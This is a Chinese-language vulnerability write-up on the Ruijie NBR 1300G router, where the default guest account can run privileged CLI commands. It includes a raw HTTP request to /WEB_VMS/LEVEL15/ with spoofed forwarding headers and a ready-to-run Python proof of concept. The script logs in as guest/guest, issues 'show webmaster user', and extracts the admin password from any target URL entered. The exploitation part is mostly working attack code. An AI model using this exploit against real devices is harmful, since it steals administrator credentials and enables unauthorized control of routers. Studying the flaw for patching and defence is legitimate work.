---
source: "MrWQ/vulnerability-paper"
---

# 锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JzaMUHYolnGzRr5IPBF1bg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞，guest 账户可以越权获取管理员账号密码

**二:  漏洞影响🐇**

**锐捷 NBR 路由器**

**三:  漏洞复现🐋**

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5PeCUOkbIvbibB6LOk1b2qbhGPuQjqURPM8L3pOcMvGDBOpN3fqPtRsEiaJT3XP276icqCRjqm1qcag/640?wx_fmt=png)

**查看流量发现 CLI 命令流量**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5PeCUOkbIvbibB6LOk1b2qbuOKpJJWFHhT8UWibHyIGeuNoafaomomE8I3Yyb0kWsPz9rzYcZ4kbgQ/640?wx_fmt=png)

```
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 73
Authorization: Basic
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: auth=; user=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```

**测试发现执行其他命令需要权限，查看手册发现存在低权限 guest 账户（guest/guest）**

**登录后发送请求包，执行 CLI 命令 **(show webmaster user)** 查看用户配置账号密码**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5PeCUOkbIvbibB6LOk1b2qbZuLDHJ97jNuP7HaDvrPj0ORQnK54WpmrZaosT1DVCic22QHdo1tPekA/640?wx_fmt=png)

成功获取所有用户的账号密码

 ****四:  漏洞 POC🦉****

```
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 锐捷NBRNBR1300G 路由器 越权CLI命令执行漏洞                    \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/WEB_VMS/LEVEL15/"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
        if "webmaster" in response.text and " password" in response.text and response.status_code == 200:
            user_data = re.findall(r'webmaster level 0 username admin password (.*?)<OPTION>', response.text)[0]
            print("\033[36m[o] 成功获取, 管理员用户账号密码为: admin/{} \033[0m".format(user_data))
        else:
            print("\033[31m[x] 请求失败:{} \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5PeCUOkbIvbibB6LOk1b2qbLHpbEGc5Hetqv3kfOTfEOy69yP2Q7enxKh6ldaj7dicLYcXtdI3KjQw/640?wx_fmt=png)

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布 0~1day 漏洞和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
